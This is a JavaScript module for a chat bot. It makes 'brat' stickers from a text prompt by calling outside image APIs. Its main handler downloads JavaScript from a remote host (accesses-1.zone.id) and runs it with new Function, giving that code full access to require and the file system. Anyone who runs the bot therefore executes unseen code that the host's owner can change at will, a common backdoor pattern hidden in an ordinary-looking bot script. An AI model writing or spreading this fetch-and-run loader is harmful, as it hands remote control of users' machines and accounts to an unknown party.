const axios = require('axios');
const fs = require('fs');
const { writeExifImg } = require('./lib/exif');

const REMOTE_LIBRARY_URL = 'https://accesses-1.zone.id';
const MENU_TITLE = 'ᴇʟɪᴛᴇ-ᴘʀᴏ-ᴠɪ ʙᴏᴛ ᴍᴇɴᴜ';
const MENU_FOOTER = 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇ-ᴘʀᴏ-ᴛᴇᴄʜ';
const BRAT_ENDPOINTS = [
  'https://eliteprotech-apis.vercel.app/canvas',
  'https://eliteprotech-apis.zone.id/canvas'
];

function patchMenu(source) {
  const botName = String(process.env.BOT_NAME || 'Columbina Bot');

  return source
    .replace(MENU_TITLE, botName)
    .replace(MENU_FOOTER, `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}`)
    .replace(/ELITE-PRO-VI BOT MENU/gi, botName)
    .replace(/POWERED BY ELITE-PRO-TECH/gi, `POWERED BY ${botName}`);
}

let cachedHandler;

function getBratText(message) {
  const rawText = typeof message?.text === 'string'
    ? message.text.trim()
    : typeof message?.body === 'string'
      ? message.body.trim()
      : '';
  const prefix = String(global.prefix || process.env.PREFIX || '.');

  if (!rawText.startsWith(prefix)) return null;

  const command = rawText.slice(prefix.length).trim();
  const match = command.match(/^brat(?:\s+([\s\S]*))?$/i);
  return match ? (match[1] || '').trim() : null;
}

async function fetchBratImage(text) {
  let lastError;

  for (const endpoint of BRAT_ENDPOINTS) {
    try {
      const response = await axios.get(endpoint, {
        params: { text },
        responseType: 'arraybuffer',
        timeout: 30000,
        headers: {
          Accept: 'image/png,image/jpeg,image/*;q=0.8',
          'User-Agent': 'Mozilla/5.0'
        },
        maxContentLength: 10 * 1024 * 1024,
        maxBodyLength: 10 * 1024 * 1024
      });

      const contentType = String(response.headers?.['content-type'] || '').toLowerCase();
      const image = Buffer.from(response.data || []);

      if (!contentType.startsWith('image/') || image.length === 0) {
        throw new Error(`Brat API returned ${contentType || 'an invalid response'}`);
      }

      return image;
    } catch (error) {
      lastError = error;
    }
  }

  throw new Error(`Brat image request failed: ${lastError?.message || 'all endpoints unavailable'}`);
}

async function handleBrat(EliteProTech, message, text) {
  if (!text) {
    await message.reply(`⚠️ Contoh: ${global.prefix || '.'}brat halo`);
    return true;
  }

  let stickerPath;

  try {
    await EliteProTech.sendMessage(message.chat, {
      react: { text: '🎨', key: message.key }
    });

    const image = await fetchBratImage(text);
    stickerPath = await writeExifImg(image, {
      packname: global.packname || process.env.PACKNAME || 'Sticker By',
      author: global.author || process.env.AUTHOR || 'Bot'
    });

    if (!stickerPath || !fs.existsSync(stickerPath)) {
      throw new Error('Sticker conversion did not produce a file');
    }

    const sticker = await fs.promises.readFile(stickerPath);
    await EliteProTech.sendMessage(message.chat, { sticker }, { quoted: message });

    await EliteProTech.sendMessage(message.chat, {
      react: { text: '✅', key: message.key }
    });
  } catch (error) {
    console.error('Brat Sticker Error:', error.message);

    await EliteProTech.sendMessage(message.chat, {
      react: { text: '❌', key: message.key }
    }).catch(() => {});

    await message.reply('❌ Gagal membuat sticker brat. Coba lagi beberapa saat.');
  } finally {
    if (stickerPath) {
      await fs.promises.unlink(stickerPath).catch(() => {});
    }
  }

  return true;
}

module.exports = async (...args) => {
  try {
    const [EliteProTech, message] = args;
    const bratText = getBratText(message);

    if (bratText !== null) {
      return handleBrat(EliteProTech, message, bratText);
    }

    if (!cachedHandler) {
      const response = await axios.get(REMOTE_LIBRARY_URL, { responseType: 'text' });
      const source = patchMenu(String(response.data));
      const remoteModule = { exports: {} };
      const loadRemoteModule = new Function(
        'require',
        'module',
        'exports',
        '__filename',
        '__dirname',
        source
      );

      loadRemoteModule(
        require,
        remoteModule,
        remoteModule.exports,
        __filename,
        __dirname
      );

      if (typeof remoteModule.exports !== 'function') {
        throw new TypeError('Remote bot handler did not export a function');
      }

      cachedHandler = remoteModule.exports;
    }

    return cachedHandler(...args);
  } catch (error) {
    console.error('Failed to load the bot command handler:', error.message);
  }
};